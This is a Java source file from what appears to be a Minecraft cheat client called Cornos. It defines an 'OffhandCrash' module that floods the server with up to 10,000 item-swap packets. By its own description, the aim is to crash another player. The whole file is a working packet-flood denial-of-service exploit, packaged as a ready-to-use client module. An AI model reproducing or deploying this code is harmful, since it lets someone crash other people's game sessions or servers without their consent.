/*
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
# Project: Cornos
# File: OffhandCrash
# Created by constantin at 14:28, MÃ¤r 13 2021
PLEASE READ THE COPYRIGHT NOTICE IN THE PROJECT ROOT, IF EXISTENT
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
*/
package me.zeroX150.cornos.features.module.impl.exploit.crash;

import me.zeroX150.cornos.Cornos;
import me.zeroX150.cornos.etc.config.MConfNum;
import me.zeroX150.cornos.etc.helper.STL;
import me.zeroX150.cornos.features.module.Module;
import me.zeroX150.cornos.features.module.ModuleType;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class OffhandCrash extends Module {
	MConfNum amount;

	public OffhandCrash() {
		super("OffhandCrash", "Crashes a player using item swapping packets", ModuleType.CRASH);
		this.amount = (MConfNum) this.mconf.add(new MConfNum("amount", 2000, 10000, 1));
	}

	@Override
	public void onExecute() {
		if (Cornos.minecraft.getNetworkHandler() == null)
			return;
		try {
			for (int i = 0; i < amount.getValue(); i++) {
				PlayerActionC2SPacket p = new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND,
						BlockPos.ORIGIN, Direction.DOWN);
				Cornos.minecraft.getNetworkHandler().sendPacket(p);
			}
		} catch (Exception ignored) {
			STL.notifyUser("Stopped the offhand crash because an error occured");
			this.setEnabled(false);
		}
		super.onExecute();
	}
}
